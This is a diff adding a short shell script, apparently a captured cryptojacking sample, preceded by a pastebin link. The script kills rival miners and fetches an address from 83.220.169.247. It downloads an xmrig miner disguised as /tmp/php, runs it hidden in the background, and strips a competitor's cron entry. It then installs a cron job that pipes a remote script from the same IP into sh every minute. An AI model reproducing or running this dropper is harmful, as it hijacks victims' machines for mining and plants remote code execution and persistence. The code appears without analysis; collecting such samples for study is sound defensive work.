@@ -1,0 +1,79 @@
+https://pastebin.com/cHeWDUaG
+
+#!/bin/sh
+
+pkill -f cryptonight
+pkill -f sustes
+pkill -f xmrig
+pkill -f xmr-stak
+pkill -f suppoie
+pkill -f zer0day.ru
+
+WGET="wget -O"
+
+if [ -s /usr/bin/curl ];
+        then WGET="curl -o";
+fi;
+if [ -s /usr/bin/wget ];
+        then WGET="wget -O";
+fi
+
+
+if [ -x "$(command -v md5sum)" ]
+then
+    sum=$(md5sum /tmp/php | awk '{ print $1 }')
+    echo $sum
+    case $sum in
+        adac96b059e07d83138b6729d35c28ce)
+            echo "php OK"
+        ;;
+        *)
+            echo "php wrong"
+            rm -rf /tmp/php
+            pkill -f p.conf
+            sleep 4
+        ;;
+    esac
+fi
+
+
+if [ ! "$(ps -fe|grep '/tmp/php -c /tmp/p.conf' |grep -v grep)" ]; then
+        f1=$(curl 83.220.169.247/g.php)
+        if [ -z "$f1" ];
+                then f1=$(wget -q -O - 83.220.169.247/g.php)
+        fi
+
+        f2="83.220.169.247"
+        if [ `getconf LONG_BIT` = "64" ]
+                then
+                $WGET /tmp/php http://$f1/xmrig_64?$RANDOM
+        else
+                $WGET /tmp/php http://$f1/xmrig_32?$RANDOM
+        fi
+
+        chmod +x /tmp/php
+        $WGET /tmp/p.conf http://$f2/p.conf
+        nohup /tmp/php -c /tmp/p.conf>/dev/null 2>&1 &
+        sleep 5
+        rm -rf /tmp/p.conf
+        #rm -f /tmp/php
+fi
+pkill -f logo9.jpg
+crontab -l | sed '/logo9/d' | crontab -
+
+if crontab -l | grep -q "83.220.169.247"
+then
+    echo "Cron exists"
+else
+    echo "Cron not found"
+    LDR="wget -q -O -"
+    if [ -s /usr/bin/curl ];
+    then
+        LDR="curl";
+    fi
+    if [ -s /usr/bin/wget ];
+    then
+        LDR="wget -q -O -";
+    fi
+    (crontab -l 2>/dev/null; echo "* * * * * $LDR http://83.220.169.247/cr2.sh | sh > /dev/null 2>&1")| crontab -
+fi
